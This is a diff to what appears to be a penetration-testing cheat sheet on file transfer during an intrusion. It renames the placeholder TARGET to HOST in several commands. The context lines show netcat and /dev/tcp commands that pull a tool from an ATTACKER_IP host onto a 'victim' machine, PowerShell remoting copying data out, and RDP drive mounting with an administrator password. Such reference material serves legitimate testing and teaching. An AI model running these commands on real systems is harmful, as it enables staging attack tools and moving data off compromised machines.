@@ -25,7 +25,7 @@ Either side can listen. Listen where the firewall lets you, connect from the oth
 
 # Target listens, you push to it
 victim$ nc -l -p 8000 > tool          # or: ncat -l -p 8000 --recv-only > tool
-attacker$ nc -q 0 TARGET 8000 < tool  # or: ncat --send-only TARGET 8000 < tool
+attacker$ nc -q 0 HOST 8000 < tool  # or: ncat --send-only HOST 8000 < tool
 
 # You listen, target pulls from you (for inbound-blocked targets)
 attacker$ sudo nc -l -p 443 -q 0 < tool
@@ -38,7 +38,7 @@ victim$ nc ATTACKER_IP 443 > tool
 # Receive a file a listener is sending
 victim$ cat < /dev/tcp/ATTACKER_IP/443 > tool
 # Or speak HTTP by hand to a web server
-victim$ exec 3<>/dev/tcp/TARGET/80; echo -e "GET /f HTTP/1.1\nHost: x\n\n" >&3; cat <&3
+victim$ exec 3<>/dev/tcp/HOST/80; echo -e "GET /f HTTP/1.1\nHost: x\n\n" >&3; cat <&3
 ```
 
 ## PowerShell Remoting (WinRM)
@@ -57,8 +57,8 @@ Copy-Item -Path C:\Users\Public\data.txt -FromSession $s -Destination C:\
 Mount a local folder into the RDP session; reach it at `\\tsclient\`.
 
 ```bash
-xfreerdp /v:TARGET /u:administrator /p:'Passw0rd!' /drive:share,/home/kali/share
-rdesktop TARGET -u administrator -p 'Passw0rd!' -r disk:share=/home/kali/share
+xfreerdp /v:HOST /u:administrator /p:'Passw0rd!' /drive:share,/home/kali/share
+rdesktop HOST -u administrator -p 'Passw0rd!' -r disk:share=/home/kali/share
 ```
 
 ## Notes
